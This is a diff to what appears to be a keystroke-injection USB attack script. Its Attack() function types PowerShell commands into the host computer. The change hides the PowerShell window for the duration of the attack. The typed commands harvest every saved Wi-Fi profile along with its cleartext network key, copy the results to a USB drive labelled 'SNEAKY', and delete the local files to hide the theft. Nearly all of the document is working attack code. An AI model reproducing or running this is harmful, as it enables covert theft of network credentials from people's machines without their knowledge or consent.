@@ -12,19 +12,19 @@ function Attack() { 		// Initalizes the function Attack that acually exfiltrates
   delay(500);
   type("powershell\n");		// Opens powershell
   delay(500);
-
+  
+  type("powershell -windowstyle hidden {"); 													// Makes the window hidden for the duration of the attack
   type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name;");	// Find the drive named "SNEAKY" and save it's path
   
   type("netsh wlan show profiles * > wirelessinfo.txt;");										// Gets the WIFI info and stores it in a txt file
   type("copy wirelessinfo.txt $usbpath.name;");													// Copyies wirelesspassword to the USB
   type("del wirelessinfo.txt;");																// Delets the copy of wirelessinfo on the host
   
-  type('(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > wifikeys.txt;');
-  																								// The above line gets the keys to the wifi networks
+  type('(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > wifikeys.txt;'); // Gets the keys to the wifi networks
   type("copy wifikeys.txt $usbpath.name;");														// Copies wifikeys to the USB
   type("del wifikeys.txt;");																	// Deletes the copy of wifikeys stored on the host
   
-  type("exit\n");  			// Closes out 
+  type("}\n");  																				// Adds the close curly bracket making the attack hidden and starts the attack
 }
 
 function Initalized() { 	// Initalizes the function that checks if the device has been initalized by the host before running the attack
